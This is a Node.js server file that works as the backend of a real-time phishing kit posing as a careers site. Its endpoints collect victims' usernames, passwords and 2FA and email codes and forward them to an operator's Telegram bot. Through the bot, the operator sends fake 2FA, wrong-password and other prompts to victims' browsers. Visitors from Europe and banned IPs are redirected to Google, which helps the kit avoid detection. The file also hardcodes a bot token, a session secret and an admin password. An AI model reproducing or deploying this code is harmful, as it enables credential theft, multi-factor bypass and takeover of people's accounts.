const express = require('express');
const session = require('express-session');
const basicAuth = require('basic-auth');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const UAParser = require('ua-parser-js');
const { sendTelegramMessage } = require('./bot/telegram');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const geoip = require('geoip-lite');

const app = express();
const server = http.createServer(app);

// ✅ FIX: use webhook instead of polling
const TELEGRAM_TOKEN = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
const APP_URL = process.env.RENDER_EXTERNAL_URL || 'https://conn.aquentcareers.io';
const WEBHOOK_PATH = `/bot${TELEGRAM_TOKEN}`;
const WEBHOOK_URL = `${APP_URL}${WEBHOOK_PATH}`;
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// set webhook on startup
bot.setWebHook(WEBHOOK_URL)
  .then(() => console.log(`✅ Webhook set to: ${WEBHOOK_URL}`))
  .catch(err => console.error('❌ Failed to set webhook:', err.message));

app.use(express.json());
app.post(WEBHOOK_PATH, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});
// ✅ END FIX

app.use(session({
  secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: true,
    sameSite: 'none',
    maxAge: 24 * 60 * 60 * 1000
  }
}));
app.use(cors({
  origin: ['https://aquentcareers.io'],
  methods: ['GET', 'POST']
}));
app.use(express.json());

const io = socketIo(server, {
  cors: {
    origin: ['https://aquentcareers.io'],
    methods: ['GET', 'POST']
  }
});

function auth(req, res, next) {
  if (req.session && req.session.authenticated) {
    return next();
  }

  const user = basicAuth(req);
  const username = 'admin';
  const password = 'asdasd700';

  if (user && user.name === username && user.pass === password) {
    req.session.authenticated = true;
    return next();
  } else {
    res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
    return res.status(401).send('Authentication required.');
  }
}

const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
app.use('/G7kP3xV1dQ', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
app.use('/public', express.static(path.join(__dirname, 'public')));

const users = {};
const userData = {};
const socketToClient = {};
const newUsers = new Set();

bot.on('callback_query', (query) => {
  const [command, clientId] = query.data.split(':');

  const map = {
    send_2fa: 'show-2fa',
    send_auth: 'show-auth',
    send_email: 'show-email',
    send_wh: 'show-whatsapp',
    send_wrong_creds: 'show-wrong-creds',
    send_old_pass: 'show-old-pass',
    send_calendar: 'show-calendar',
  };

  if (command === 'disconnect') {
    disconnectClient(clientId);
    bot.answerCallbackQuery(query.id, { text: 'Client disconnected.' });
  } else if (map[command]) {
    emitToClient(clientId, map[command]);
    bot.answerCallbackQuery(query.id, { text: `Sent ${command.replace('_', ' ')}` });
    const msg = `📩 *Command Sent to Client*\n\n` +
      `📤 *Command:* \`${command}\`\n` +
      `🆔 *Client ID:* \`${clientId}\``;
    sendTelegramMessage(msg, clientId, true);
  } else if (command === 'ban_ip') {
    const ip = userData[clientId]?.ip;
    if (ip) {
      banIp(ip);
      bot.answerCallbackQuery(query.id, { text: `Banned IP: ${ip}` });
      disconnectClient(clientId);
      sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
    } else {
      bot.answerCallbackQuery(query.id, { text: 'IP not found for client.' });
    }
  }
  else {
    bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
  }
});

function formatDateTime(date) {
  return {
    full: date.toISOString(),
    date: date.toLocaleDateString(),
    time: date.toLocaleTimeString(),
    timestamp: Date.now()
  };
}

function updatePanelUsers() {
  const data = Object.values(userData)
    .filter(user => user?.time?.timestamp && Date.now() - user.time.timestamp <= 2 * 60 * 60 * 1000)
    .sort((a, b) => b.time.timestamp - a.time.timestamp);

  io.of('/panel').emit('update-users', {
    users: data,
    newUsers: Array.from(newUsers)
  });
}

io.on('connection', async (socket) => {
  const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
  const userAgent = socket.handshake.headers['user-agent'];
  const timestamp = formatDateTime(new Date());

  const geo = geoip.lookup(clientIP);
  const isEuropean =
    geo &&
    geo.country &&
    ['AL','AD','AT','BE','BA','BG','BY','CH','CY','CZ','DE','DK','EE','ES','FI','FR','GB','GR','HR','HU','IE','IS','IT','LT','LU','LV','MC','MD','ME','MK','MT','NL','NO','PL','PT','RO','RS','RU','SE','SI','SK','SM','UA','VA'].includes(geo.country);

  if (isBanned(clientIP) || isEuropean) {
    socket.emit('redirect', 'https://www.google.com/');
    socket.disconnect();
    return;
  }

  let clientId = socket.handshake.query.clientId;
  if (!clientId || typeof clientId !== 'string') {
    clientId = crypto.randomBytes(16).toString('hex');
    socket.emit('assign-client-id', clientId);
  }

  socketToClient[socket.id] = clientId;
  users[socket.id] = socket;

  const parser = new UAParser(userAgent);
  const browserName = parser.getBrowser().name || 'Unknown';

  let city = 'Unknown', country = 'Unknown', isp = 'Unknown';
  try {
    const res = await axios.get(`http://ip-api.com/json/${clientIP}`);
    if (res.data && res.data.status === 'success') {
      city = res.data.city || 'Unknown';
      country = res.data.country || 'Unknown';
      isp = res.data.isp || 'Unknown';
    }
  } catch (err) {
    console.error('GeoIP lookup failed:', err.message);
  }

  let connectionHandled = false;

  const connectionTimeout = setTimeout(() => {
    if (!connectionHandled) {
      const isNewUser = !userData[clientId];

      userData[clientId] = {
        ...(userData[clientId] || {}),
        id: clientId,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        login: userData[clientId]?.login || {},
        codes: userData[clientId]?.codes || [],
        action: null
      };

      if (isNewUser) {
        newUsers.add(clientId);

        const msg =
          `🌟 *New Connection Established*\n\n` +
          `🆔 *Client ID:* \`${clientId}\`\n` +
          `🌍 *IP Address:* \`${clientIP}\`\n` +
          `🏙 *City:* \`${city}\`\n` +
          `🏳️ *Country:* \`${country}\`\n` +
          `🌐 *Browser:* \`${browserName}\`\n` +
          `🛣 *Provider:* \`${isp}\`\n\n` +
          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\``;

        sendTelegramMessage(msg, clientId, 'banOnly');
      }

      updatePanelUsers();
    }
  }, 3000);

  socket.on('userConnectedToPage', (data) => {
    connectionHandled = true;
    clearTimeout(connectionTimeout);

    const cid = data.clientId || socket.id;
    socketToClient[socket.id] = cid;

    if (!userData[cid]) {
      userData[cid] = {
        id: cid,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        login: {},
        codes: [],
        action: data.page || null
      };
    } else {
      userData[cid].action = data.page;
    }

    const pageMsg = `🌐 *User Connected to Page*\n\n` +
      `📄 *Page:* \`${data.page}\`\n` +
      `📱 *cid:* \`${cid}\``;

    sendTelegramMessage(pageMsg, cid, false);
    updatePanelUsers();
  });

  socket.on('disconnect', () => {
    const cid = socketToClient[socket.id];
    if (cid && userData[cid]) {
      userData[cid].isConnected = false;
    }
    delete users[socket.id];
    delete socketToClient[socket.id];
    newUsers.delete(clientId);
    updatePanelUsers();
  });
});

function isBanned(ip) {
  try {
    const bannedIps = fs.readFileSync(BAN_LIST_FILE, 'utf8').split('\n');
    return bannedIps.includes(ip.trim());
  } catch (e) {
    return false;
  }
}

function banIp(ip) {
  const cleanIp = ip.trim();

  if (!isBanned(cleanIp)) {
    try {
      if (fs.existsSync(BAN_LIST_FILE)) {
        const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
        if (!data.endsWith('\n')) {
          fs.appendFileSync(BAN_LIST_FILE, '\n');
        }
      }
      fs.appendFileSync(BAN_LIST_FILE, `${cleanIp}\n`);
    } catch (err) {
      console.error('Error saving banned IP:', err);
    }
  }
}

io.of('/panel').on('connection', (socket) => {
  updatePanelUsers();
  // ... panel socket events unchanged ...
});

function emitToClient(clientId, event, data = null) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    users[socketId].emit(event, data);
  }
}

function disconnectClient(clientId) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    users[socketId].disconnect(true);
  }
}

function getSocketIdByClientId(clientId) {
  return Object.entries(socketToClient)
    .find(([_, cid]) => cid === clientId)?.[0];
}

app.post('/send-auth-code', (req, res) => {
  const { code, socketId } = req.body;
  if (!code || code.length !== 6) return res.status(400).json({ message: 'Invalid authentication code.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });

  const message = `🔐 *Code*\n\nThe 6-digit authentication code is: \`${code}\`\n\nClient ID: \`${clientId}\``;
  sendTelegramMessage(message, clientId, true);

  userData[clientId].codes.push(code);
  userData[clientId].action = '2FA';
  updatePanelUsers();

  res.json({ message: 'Code sent successfully!' });
});

app.post('/send-email-code', (req, res) => {
  const { code, socketId } = req.body;
  if (!code || code.length !== 8) return res.status(400).json({ message: 'Invalid authentication code.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });

  const message = `🔐 *Email Code*\n\nThe 8-digit authentication code is: \`${code}\`\n\nClient ID: \`${clientId}\``;
  sendTelegramMessage(message, clientId, true);

  userData[clientId].codes.push(code);
  userData[clientId].action = 'Email';
  updatePanelUsers();

  res.json({ message: 'Code sent successfully!' });
});

app.post('/send-login-data', (req, res) => {
  const { username, password, socketId } = req.body;
  if (!username || !password) return res.status(400).json({ message: 'Username and password are required.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });

  const message = `🔐 *Login Attempt*\n\n` +
    `🔷 *Username:* \`${username}\`\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `Client ID: \`${clientId}\``;

  sendTelegramMessage(message, clientId, true);

  userData[clientId].login = { username, password };
  userData[clientId].action = 'Login';
  updatePanelUsers();

  res.json({ success: true, message: 'Login data sent successfully!' });
});

server.listen(3001, () => console.log('Server running on http://localhost:3001'));
